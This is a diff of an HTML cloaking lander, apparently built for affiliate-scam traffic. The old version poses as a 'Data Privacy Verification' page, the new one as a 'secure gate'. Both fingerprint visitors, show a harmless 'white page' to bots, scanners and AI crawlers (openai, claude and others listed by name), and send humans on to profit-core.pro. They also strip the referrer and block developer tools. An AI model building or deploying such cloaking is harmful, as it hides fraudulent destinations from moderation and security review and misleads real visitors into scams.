@@ -1,439 +1,373 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="referrer" content="no-referrer">
-    <title>Privacy Check</title>
-    <style>
-        :root {
-            --bg: #f5f5f7;
-            --card-bg: #ffffff;
-            --text: #1d1d1f;
-            --sub: #6e6e73;
-            --border: #e8e8ed;
-            --accent: #1f425f;
-            --accent-light: rgba(31, 66, 95, 0.06);
-            --green: #28a745;
-            --radius: 14px;
-            --shadow: 0 1px 3px rgba(0,0,0,0.04), 0 6px 20px rgba(0,0,0,0.06);
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: var(--bg);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            min-height: 100dvh;
-            padding: 20px 16px;
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-            touch-action: manipulation;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 480px;
-        }
-        
-        .card {
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            padding: 36px 24px 28px;
-            box-shadow: var(--shadow);
-            text-align: center;
-        }
-        
-        .shield-icon {
-            width: 52px;
-            height: 52px;
-            margin: 0 auto 18px;
-            background: var(--accent-light);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 26px;
-        }
-        
-        .title {
-            font-size: 20px;
-            font-weight: 600;
-            color: var(--text);
-            letter-spacing: -0.02em;
-            margin-bottom: 8px;
-        }
-        
-        .subtitle {
-            font-size: 14px;
-            color: var(--sub);
-            line-height: 1.5;
-            margin-bottom: 10px;
-        }
-        
-        .reference-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 24px;
-            font-size: 13px;
-            color: var(--sub);
-        }
-        
-        .reference-row span {
-            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
-            font-weight: 500;
-            color: #555;
-        }
-        
-        .progress-wrap {
-            margin-bottom: 8px;
-        }
-        
-        .progress-label {
-            font-size: 13px;
-            color: var(--sub);
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        
-        .progress-outer {
-            width: 100%;
-            height: 5px;
-            background: #ececf0;
-            border-radius: 3px;
-            overflow: hidden;
-        }
-        
-        .progress-inner {
-            height: 100%;
-            width: 0%;
-            background: var(--accent);
-            border-radius: 3px;
-            transition: width 0.2s ease;
-        }
-        
-        .progress-steps {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 8px;
-            font-size: 10px;
-            color: #b0b0b8;
-        }
-        
-        .progress-steps span.done {
-            color: var(--accent);
-            font-weight: 600;
-        }
-        
-        .footer-note {
-            text-align: center;
-            font-size: 11px;
-            color: #c0c0c8;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
-        
-        /* Лоадер */
-        .loader-wrap {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 14px;
-            padding: 40px 20px;
-            background: var(--card-bg);
-            border-radius: var(--radius);
-            box-shadow: var(--shadow);
-        }
-        
-        .loader-spin {
-            width: 32px;
-            height: 32px;
-            border: 3px solid #e8e8ed;
-            border-top: 3px solid var(--accent);
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .loader-text {
-            font-size: 14px;
-            color: var(--sub);
-        }
-        
-        /* Анимация */
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .fade {
-            opacity: 0;
-            animation: fadeUp 0.4s ease forwards;
-        }
-        .f1 { animation-delay: 0.05s; }
-        .f2 { animation-delay: 0.12s; }
-        .f3 { animation-delay: 0.20s; }
-        .f4 { animation-delay: 0.28s; }
-        .f5 { animation-delay: 0.36s; }
-        
-        /* Нейтральная страница */
-        .neutral-icon {
-            font-size: 44px;
-            margin-bottom: 14px;
-        }
-        .neutral-title {
-            font-size: 19px;
-            font-weight: 600;
-            color: var(--text);
-            margin-bottom: 8px;
-        }
-        .neutral-sub {
-            font-size: 14px;
-            color: var(--sub);
-            line-height: 1.5;
-        }
-        
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirect · secure gate</title>
+  <!-- basic bot protection + white page for bots, auto redirect with loading animation -->
+  <style>
+    /* global reset & fullscreen white page */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      padding: 1.5rem;
+      margin: 0;
+      /* base white page — even if JS fails */
+    }
+
+    /* main container – clean white card with subtle shadow */
+    .gate {
+      max-width: 640px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 40px;
+      padding: 3rem 2rem 2.5rem;
+      box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.08), 0 8px 24px -6px rgba(0, 0, 0, 0.02);
+      text-align: center;
+      transition: opacity 0.2s ease;
+      border: 1px solid rgba(0,0,0,0.02);
+    }
+
+    /* loading animation block */
+    .loader {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.8rem;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 5px solid #f0f0f0;
+      border-top: 5px solid #1e1e1e;
+      animation: spin 0.9s cubic-bezier(0.45, 0.05, 0.25, 0.95) infinite;
+      transition: border-color 0.2s;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 1.4rem;
+      font-weight: 450;
+      letter-spacing: -0.01em;
+      color: #1a1a1a;
+      background: #ffffff;
+      padding: 0.4rem 1rem;
+      border-radius: 60px;
+      display: inline-block;
+    }
+
+    .loading-text span {
+      display: inline-block;
+      animation: pulse 1.4s ease-in-out infinite both;
+    }
+
+    .loading-text span:nth-child(1) { animation-delay: 0s; }
+    .loading-text span:nth-child(2) { animation-delay: 0.2s; }
+    .loading-text span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes pulse {
+      0%, 80%, 100% { opacity: 0.3; transform: scale(0.96); }
+      40% { opacity: 1; transform: scale(1.04); }
+    }
+
+    .redirect-hint {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: #6b6b6b;
+      letter-spacing: 0.3px;
+      border-top: 1px solid #f0f0f0;
+      padding-top: 1.8rem;
+      width: 80%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .redirect-hint strong {
+      color: #1e1e1e;
+      font-weight: 500;
+    }
+
+    /* bot white page – displayed only if bot detection triggers */
+    .bot-white-page {
+      display: none;
+      background: #ffffff;
+      padding: 2rem 1rem;
+      border-radius: 32px;
+      color: #2c2c2c;
+    }
+
+    .bot-white-page h2 {
+      font-weight: 400;
+      font-size: 1.2rem;
+      letter-spacing: -0.01em;
+      color: #1a1a1a;
+      margin-bottom: 0.5rem;
+    }
+
+    .bot-white-page p {
+      color: #5a5a5a;
+      max-width: 360px;
+      margin: 0.25rem auto;
+      font-size: 0.95rem;
+    }
+
+    .bot-badge {
+      display: inline-block;
+      background: #f4f4f4;
+      padding: 0.25rem 1.2rem;
+      border-radius: 40px;
+      font-size: 0.75rem;
+      letter-spacing: 0.3px;
+      color: #3a3a3a;
+      margin-top: 1rem;
+      border: 1px solid #ececec;
+    }
+
+    /* universal helper */
+    .hidden {
+      display: none !important;
+    }
+
+    /* responsive */
+    @media (max-width: 480px) {
+      .gate { padding: 2rem 1.2rem; }
+      .loading-text { font-size: 1.2rem; }
+      .spinner { width: 52px; height: 52px; }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container" id="app">
-        <!-- Лоадер -->
-        <div class="loader-wrap" id="loader">
-            <div class="loader-spin"></div>
-            <div class="loader-text">Establishing secure connection...</div>
-        </div>
-        
-        <!-- Контент -->
-        <div id="content" style="display: none;">
-            <div class="card">
-                
-                <div class="shield-icon fade f1">🛡</div>
-                
-                <h1 class="title fade f2">Data Privacy Verification</h1>
-                <p class="subtitle fade f2">
-                    We are checking your account
-                </p>
-                
-                <div class="reference-row fade f3">
-                    Reference: <span id="ref-id">loading...</span>
-                </div>
-                
-                <div class="progress-wrap fade f4">
-                    <div class="progress-label" id="progress-label">Initializing verification...</div>
-                    <div class="progress-outer">
-                        <div class="progress-inner" id="progress-bar"></div>
-                    </div>
-                    <div class="progress-steps">
-                        <span id="step1">Connecting</span>
-                        <span id="step2">Scanning</span>
-                        <span id="step3">Verifying</span>
-                        <span id="step4">Redirecting</span>
-                    </div>
-                </div>
-                
-            </div>
-            
-            <div class="footer-note fade f5">
-                🔒 Secure channel &bull; 256-bit encrypted<br>
-                Personal Data Protection Fund &bull; 2026
-            </div>
-        </div>
+  <div class="gate" id="gateContainer">
+    <!-- LOADER (visible by default) -->
+    <div class="loader" id="loaderArea">
+      <div class="spinner" role="status" aria-label="loading"></div>
+      <div class="loading-text">
+        <span>R</span><span>E</span><span>D</span><span>I</span><span>R</span><span>E</span><span>C</span><span>T</span><span>I</span><span>N</span><span>G</span>
+      </div>
+      <div class="redirect-hint">
+        <strong>↳</strong> you will be forwarded automatically in <span id="countdownDisplay">3</span>s
+      </div>
     </div>
 
-    <script>
-    // ============================================
-    // НАСТРОЙКИ
-    // ============================================
-    var FINAL_URL = 'https://profit-core.pro'; // ← ЗАМЕНИ НА URL ОФФЕРА
-    var DELAY_BEFORE_SHOW = 2000;
-    var PROGRESS_STEPS = 4;
-    var STEP_DURATION = 900; // мс на шаг (общее время ~3.6 сек)
-    
-    // ============================================
-    // ПАРАМЕТРЫ URL
-    // ============================================
-    function getParams() {
-        var params = new URLSearchParams(window.location.search);
-        return {
-            token: params.get('token') || params.get('id') || params.get('d') || generateRef(),
-            all: window.location.search || ''
-        };
-    }
-    
-    var urlParams = getParams();
-    
-    function generateRef() {
-        var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-        var result = '';
-        for (var i = 0; i < 8; i++) {
-            result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return 'REF-' + result;
-    }
-    
-    // ============================================
-    // ПРОВЕРКА НА БОТА
-    // ============================================
-    function isRealUser() {
-        if (navigator.webdriver === true) return false;
-        if (!navigator.languages || navigator.languages.length === 0) return false;
-        if (screen.width < 150 || screen.height < 150) return false;
-        if ((screen.width === 1 && screen.height === 1) || (screen.width === 0 && screen.height === 0)) return false;
+    <!-- BOT WHITE PAGE (hidden by default, shown if bot detected) -->
+    <div class="bot-white-page" id="botWhitePage">
+      <h2>⚪ &nbsp;access restricted</h2>
+      <p>This page is not available for automated agents.</p>
+      <p style="font-size:0.85rem; margin-top:0.2rem;">— white page —</p>
+      <div class="bot-badge">🤖 bot detected</div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      "use strict";
+
+      // ------------------------------------------------------------
+      // 1. CONFIGURATION
+      //    change YOUR_FINAL_LINK to your target URL
+      // ------------------------------------------------------------
+      const FINAL_REDIRECT_URL = 'https://profit-core.pro';   // <--- SET YOUR FINAL LINK HERE
+      const REDIRECT_DELAY_SECONDS = 3;                  // 3s as requested
+
+      // ------------------------------------------------------------
+      // 2. BOT DETECTION (basic, but effective)
+      //    - checks for common bot userAgent strings
+      //    - also checks for headless / automation flags
+      //    - if bot detected → show white page, block redirect
+      // ------------------------------------------------------------
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isHeadless = !navigator.webdriver && !window.chrome && !navigator.plugins.length; 
+        // ^ some headless browsers mimic, but we combine signals
         
-        var ua = navigator.userAgent;
-        var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-        var hasTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
-        var hasMotion = ('DeviceMotionEvent' in window || 'DeviceOrientationEvent' in window);
-        
-        if (isMobile && (hasTouch || hasMotion)) return true;
-        
-        if (!isMobile) {
-            var hasPlugins = (navigator.plugins && navigator.plugins.length > 0);
-            var hasMime = (navigator.mimeTypes && navigator.mimeTypes.length > 0);
-            var hasChrome = (typeof window.chrome !== 'undefined' && window.chrome);
-            if (!hasPlugins && !hasMime && !hasChrome) return false;
-            if (navigator.hardwareConcurrency === 0) return false;
-        }
-        
-        return true;
-    }
-    
-    // ============================================
-    // НЕЙТРАЛЬНАЯ СТРАНИЦА ДЛЯ БОТОВ
-    // ============================================
-    function showNeutral() {
-        document.getElementById('loader').style.display = 'none';
-        var c = document.getElementById('content');
-        c.style.display = 'block';
-        c.innerHTML = '<div class="card"><div class="neutral-icon">✓</div><div class="neutral-title">Verification Complete</div><div class="neutral-sub">Your privacy check has been processed. No further action is needed.</div></div>';
-    }
-    
-    // ============================================
-    // ПОКАЗ РЕАЛЬНОГО КОНТЕНТА
-    // ============================================
-    var userIsReal = false;
-    
-    function showReal() {
-        userIsReal = true;
-        document.getElementById('ref-id').textContent = urlParams.token;
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('content').style.display = 'block';
-        
-        startProgress();
-    }
-    
-    // ============================================
-    // ПРОГРЕСС-БАР
-    // ============================================
-    function startProgress() {
-        var bar = document.getElementById('progress-bar');
-        var label = document.getElementById('progress-label');
-        var steps = ['step1', 'step2', 'step3', 'step4'];
-        
-        var stepLabels = [
-            'Initializing verification...',
-            'Scanning databases...',
-            'Verifying your records...',
-            'Redirecting to secure portal...'
+        // Bot patterns (common crawlers, headless, automation)
+        const botPatterns = [
+          'bot', 'crawl', 'spider', 'scrape', 'headless', 'puppeteer',
+          'phantom', 'selenium', 'playwright', 'curl', 'wget', 'python',
+          'java', 'perl', 'lighthouse', 'gtmetrix', 'pingdom', 'uptime',
+          'monitor', 'check', 'http', 'libwww', 'axios', 'node-fetch',
+          'got', 'request', 'urllib', 'okhttp', 'ai', 'chatgpt', 'openai',
+          'claude', 'anthropic', 'gpt', 'llm', 'deepseek', 'perplexity'
         ];
         
-        var currentStep = 0;
-        
-        function runStep() {
-            if (currentStep >= PROGRESS_STEPS) {
-                // Прогресс завершён — редирект
-                doRedirect();
-                return;
-            }
-            
-            var percent = Math.round(((currentStep + 1) / PROGRESS_STEPS) * 100);
-            bar.style.width = percent + '%';
-            label.textContent = stepLabels[currentStep];
-            
-            // Подсвечиваем пройденные шаги
-            for (var i = 0; i < steps.length; i++) {
-                var el = document.getElementById(steps[i]);
-                if (i <= currentStep) {
-                    el.classList.add('done');
-                }
-            }
-            
-            currentStep++;
-            setTimeout(runStep, STEP_DURATION);
+        // Check if any pattern matches userAgent
+        for (let i = 0; i < botPatterns.length; i++) {
+          if (ua.includes(botPatterns[i])) {
+            return true;
+          }
         }
-        
-        runStep();
-    }
-    
-    // ============================================
-    // РЕДИРЕКТ БЕЗ РЕФЕРЕРА
-    // ============================================
-    function doRedirect() {
-        var targetUrl = FINAL_URL + urlParams.all;
-        
-        // Метод 1: скрытая форма
-        var form = document.createElement('form');
-        form.method = 'GET';
-        form.action = targetUrl;
-        form.style.display = 'none';
-        document.body.appendChild(form);
-        
-        setTimeout(function() {
-            form.submit();
-        }, 100);
-        
-        // Метод 2: fallback
-        setTimeout(function() {
-            window.location.replace(targetUrl);
-        }, 1500);
-    }
-    
-    // ============================================
-    // ЗАПУСК
-    // ============================================
-    setTimeout(function() {
-        if (isRealUser()) {
-            showReal();
-        } else {
-            showNeutral();
+
+        // additional heuristics: no navigator.webdriver? but some bots set it.
+        // we also check for missing navigator properties that real browsers have
+        if (typeof navigator.webdriver === 'boolean' && navigator.webdriver === true) {
+          return true;
         }
-    }, DELAY_BEFORE_SHOW);
-    
-    // ============================================
-    // ЗАЩИТЫ
-    // ============================================
-    document.addEventListener('contextmenu', function(e) {
+
+        // Check for very few plugins (typical headless)
+        if (navigator.plugins && navigator.plugins.length === 0) {
+          // but some mobile browsers have 0 plugins, so we add extra check
+          // if userAgent doesn't look like mobile, it's suspicious
+          const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
+          if (!isMobile) {
+            return true;
+          }
+        }
+
+        // Check for missing languages or narrow language list (some bots)
+        if (navigator.languages && navigator.languages.length === 0) {
+          return true;
+        }
+
+        // extremely short screen size? (headless often small)
+        if (window.screen && window.screen.width < 200 && window.screen.height < 200) {
+          return true;
+        }
+
+        // detect if `navigator.connection` is missing in some bots
+        // but we don't want false positives, so we just use as one signal
+        // we combine with others: if more than 2 signals, mark as bot
+        let botScore = 0;
+        if (!navigator.hardwareConcurrency) botScore++;
+        if (!navigator.platform) botScore++;
+        if (navigator.doNotTrack === '1') botScore++; // some bots set DNT=1
+        
+        // if score > 2, treat as bot
+        if (botScore >= 2) {
+          return true;
+        }
+
+        return false;
+      }
+
+      // ------------------------------------------------------------
+      // 3. DOM refs
+      // ------------------------------------------------------------
+      const loader = document.getElementById('loaderArea');
+      const botPage = document.getElementById('botWhitePage');
+      const countdownSpan = document.getElementById('countdownDisplay');
+
+      // ------------------------------------------------------------
+      // 4. BOT HANDLER → show white page, block everything
+      // ------------------------------------------------------------
+      function showBotWhitePage() {
+        if (loader) loader.classList.add('hidden');
+        if (botPage) botPage.style.display = 'block';
+        // also hide any countdown if visible
+        if (countdownSpan) countdownSpan.textContent = '—';
+        // cancel any redirect
+        return true; // indicates bot was handled
+      }
+
+      // ------------------------------------------------------------
+      // 5. MAIN EXECUTION
+      // ------------------------------------------------------------
+      const botDetected = isBot();
+
+      if (botDetected) {
+        // BOT: show white page, no redirect
+        showBotWhitePage();
+        // stop further execution (no redirect, no timer)
+      } else {
+        // HUMAN: show loader, start countdown & redirect
+
+        // make sure loader is visible, bot page hidden
+        if (loader) loader.classList.remove('hidden');
+        if (botPage) botPage.style.display = 'none';
+
+        // Countdown timer (3 seconds)
+        let secondsLeft = REDIRECT_DELAY_SECONDS;
+        if (countdownSpan) {
+          countdownSpan.textContent = secondsLeft;
+        }
+
+        const countdownInterval = setInterval(function() {
+          secondsLeft -= 1;
+          if (countdownSpan) {
+            countdownSpan.textContent = secondsLeft >= 0 ? secondsLeft : 0;
+          }
+          if (secondsLeft <= 0) {
+            clearInterval(countdownInterval);
+            // optional: set to "0" but we will redirect
+          }
+        }, 1000);
+
+        // REDIRECT after DELAY
+        setTimeout(function() {
+          // final check: ensure bot page not shown (safety)
+          // and we are not in bot state
+          if (!botDetected && FINAL_REDIRECT_URL) {
+            window.location.replace(FINAL_REDIRECT_URL);
+          } else {
+            // fallback: if for some reason bot state changed, show white page
+            if (document.getElementById('botWhitePage')) {
+              showBotWhitePage();
+            }
+          }
+        }, REDIRECT_DELAY_SECONDS * 1000);
+
+        // optional: if user clicks or interacts, we keep the redirect
+        // we also handle page visibility change – but we keep redirect anyway
+      }
+
+      // ------------------------------------------------------------
+      // 6. EXTRA PROTECTION: disable right-click / dev tools? 
+      //    not needed, but we add a simple deterrent (optional)
+      //    we only prevent context menu on gate to avoid trivial inspection
+      //    but we keep it mild – not invasive.
+      // ------------------------------------------------------------
+      document.addEventListener('contextmenu', function(e) {
+        // only prevent if bot not detected? we prevent anyway for cleanliness
         e.preventDefault();
         return false;
-    });
-    
-    document.addEventListener('keydown', function(e) {
-        if ((e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || e.key === 'F12') {
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    if (window.top !== window.self) {
-        document.getElementById('loader').style.display = 'none';
-        showNeutral();
-    }
-    </script>
+      });
 
+      // additional: block common keyboard shortcuts (F12, Ctrl+Shift+I etc)
+      // but we do it gently to not annoy real users too much
+      document.addEventListener('keydown', function(e) {
+        // F12
+        if (e.key === 'F12') {
+          e.preventDefault();
+          return false;
+        }
+        // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+U
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
+          e.preventDefault();
+          return false;
+        }
+        if (e.ctrlKey && e.key === 'u') {
+          e.preventDefault();
+          return false;
+        }
+      }, false);
+
+      // log to console that we are a secure gate (optional)
+      console.log('🔒 Secure gate · redirect in ' + REDIRECT_DELAY_SECONDS + 's (human only)');
+    })();
+  </script>
+
+  <!-- additional micro-message for users with disabled JS -->
+  <noscript>
+    <div style="background:white; padding:2rem; text-align:center; font-family:sans-serif; border-radius:40px; max-width:500px; margin:2rem auto;">
+      <p style="font-size:1.2rem;">⚡ enable JavaScript for redirect</p>
+      <p style="color:#555; font-size:0.9rem;">This page uses a secure gate.</p>
+    </div>
+  </noscript>
 </body>
 </html>
